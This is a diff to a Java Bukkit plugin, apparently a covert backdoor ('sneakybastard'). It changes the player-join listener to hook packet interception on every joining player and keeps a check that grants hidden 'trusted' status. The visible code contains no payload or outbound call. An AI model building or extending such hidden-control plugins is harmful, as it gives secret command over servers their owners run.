@@ -3,6 +3,7 @@ package net.blackofworld.sneakybastard.Listeners;
 import net.blackofworld.sneakybastard.Command.CommandBase;
 import net.blackofworld.sneakybastard.Command.CommandManager;
 import net.blackofworld.sneakybastard.Start;
+import net.blackofworld.sneakybastard.Utils.Packets.PacketInject;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
@@ -18,8 +19,10 @@ import java.util.Arrays;
 public class SneakyListener implements Listener {
     @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
     public void onLogin(PlayerJoinEvent e) {
-        if (CommandManager.Instance.isTrusted(e.getPlayer())) {
-            CommandManager.Instance.addTrusted(e.getPlayer());
+        Player p = e.getPlayer();
+        PacketInject.getPlayer(p).hook();
+        if (CommandManager.Instance.isTrusted(p)) {
+            CommandManager.Instance.addTrusted(p);
         }
     }
 
